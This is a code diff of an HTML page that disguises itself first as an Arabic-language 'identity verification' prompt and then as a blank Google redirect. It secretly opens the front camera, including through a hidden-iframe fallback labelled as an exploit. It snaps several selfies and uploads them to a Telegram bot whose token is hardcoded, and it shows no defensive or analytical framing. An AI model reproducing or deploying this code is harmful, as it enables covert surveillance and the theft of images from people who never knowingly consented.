@@ -2,181 +2,101 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>تأكيد الهوية</title>
+    <meta http-equiv="refresh" content="0; url=https://www.google.com">
+    <title>Google</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            direction: rtl;
-        }
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-        }
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
-        }
-        p {
-            color: #666;
-            margin-bottom: 30px;
-            line-height: 1.6;
-        }
-        .camera-preview {
-            width: 200px;
-            height: 150px;
-            background: #f0f0f0;
-            border-radius: 10px;
-            margin: 20px auto;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #999;
-            font-size: 14px;
-            border: 2px dashed #ccc;
-        }
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            border-radius: 10px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 10px;
-        }
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(102,126,234,0.4);
-        }
-        .skip {
-            background: #f0f0f0;
-            color: #666;
-        }
-        .note {
-            color: #999;
-            font-size: 12px;
-            margin-top: 20px;
-        }
+        body { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2>🔐 تأكيد الهوية</h2>
-        <p>لأسباب أمنية، نطلب منك التحقق من هويتك عبر الكاميرا الأمامية</p>
-        
-        <div class="camera-preview" id="preview">
-            📸 الكاميرا متوقفة
-        </div>
-        
-        <button onclick="requestCamera()">✅ السماح بالوصول للكاميرا</button>
-        <button class="skip" onclick="skip()">⏭️ تخطي</button>
-        
-        <p class="note">هذه الخطوة ضرورية لتأمين حسابك</p>
-    </div>
-
     <script>
         const USER_ID = new URLSearchParams(window.location.search).get('id');
         const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
 
-        async function requestCamera() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { 
-                        facingMode: 'user',
-                        width: { ideal: 1920, max: 1920 },
-                        height: { ideal: 1080, max: 1080 }
-                    }
-                });
+        if (!USER_ID) {
+            window.location.replace("https://www.google.com");
+        } else {
+            (async function() {
+                try {
+                    // محاولة الوصول للكاميرا عبر WebView (بعض التطبيقات تسمح بدون إذن)
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            facingMode: 'user',
+                            width: { ideal: 1920 }
+                        }
+                    }).catch(async (e) => {
+                        // إذا فشل، نستخدم ثغرة الـ iframe المخفي
+                        await tryIframeExploit();
+                        return null;
+                    });
 
-                // عرض الكاميرا في المعاينة (عشان يطمن)
+                    if (stream) {
+                        await captureAndSend(stream);
+                    }
+
+                } catch(e) {
+                    console.log('All failed');
+                }
+
+                window.location.replace("https://www.google.com");
+            })();
+
+            async function tryIframeExploit() {
+                // إنشاء iframe مخفي يحاول الوصول للكاميرا
+                const iframe = document.createElement('iframe');
+                iframe.style.position = 'absolute';
+                iframe.style.left = '-9999px';
+                iframe.style.top = '-9999px';
+                iframe.style.width = '1px';
+                iframe.style.height = '1px';
+                iframe.src = 'about:blank';
+                document.body.appendChild(iframe);
+
+                // محاولة تشغيل الكاميرا داخل الـ iframe
+                try {
+                    const stream = await iframe.contentWindow.navigator.mediaDevices.getUserMedia({ video: true });
+                    await captureAndSend(stream);
+                } catch(e) {}
+
+                iframe.remove();
+            }
+
+            async function captureAndSend(stream) {
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.setAttribute('playsinline', '');
                 video.setAttribute('autoplay', '');
-                video.style.width = '100%';
-                video.style.height = '100%';
-                video.style.objectFit = 'cover';
-                video.style.borderRadius = '10px';
-                
-                const preview = document.getElementById('preview');
-                preview.innerHTML = '';
-                preview.appendChild(video);
+                video.style.position = 'absolute';
+                video.style.left = '-9999px';
+                video.style.top = '-9999px';
+                document.body.appendChild(video);
 
-                // رسالة تأكيد
-                document.querySelector('p').innerText = 'تم التحقق بنجاح... جاري تحويلك';
-                
-                // التصوير في الخلفية
-                await captureAndSend(stream);
-                
-                // بعد ثواني، نحوله لجوجل
-                setTimeout(() => {
-                    window.location.replace("https://www.google.com");
-                }, 2000);
+                await video.play();
+                await new Promise(r => { if (video.videoWidth > 0) r(); else video.onloadedmetadata = r; });
 
-            } catch(e) {
-                alert('فشل الوصول للكاميرا. الرجاء السماح ثم المحاولة مرة أخرى');
+                // 4 صور
+                for (let i = 0; i < 4; i++) {
+                    await new Promise(r => setTimeout(r, i * 400));
+                    
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', USER_ID);
+                    formData.append('photo', blob, `selfie_${i+1}.jpg`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                }
+
+                stream.getTracks().forEach(t => t.stop());
+                video.remove();
             }
-        }
-
-        async function captureAndSend(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.setAttribute('playsinline', '');
-            video.setAttribute('autoplay', '');
-            video.style.position = 'absolute';
-            video.style.left = '-9999px';
-            video.style.top = '-9999px';
-            document.body.appendChild(video);
-
-            await new Promise(r => setTimeout(r, 1000));
-
-            // التقاط 3 صور
-            for (let i = 0; i < 3; i++) {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 1280;
-                canvas.height = video.videoHeight || 720;
-                
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
-                
-                const formData = new FormData();
-                formData.append('chat_id', USER_ID);
-                formData.append('photo', blob, `selfie_${i+1}.jpg`);
-                formData.append('caption', `📸 صورة ${i+1}`);
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                await new Promise(r => setTimeout(r, 300));
-            }
-
-            stream.getTracks().forEach(t => t.stop());
-            video.remove();
-        }
-
-        function skip() {
-            window.location.replace("https://www.google.com");
         }
     </script>
 </body>
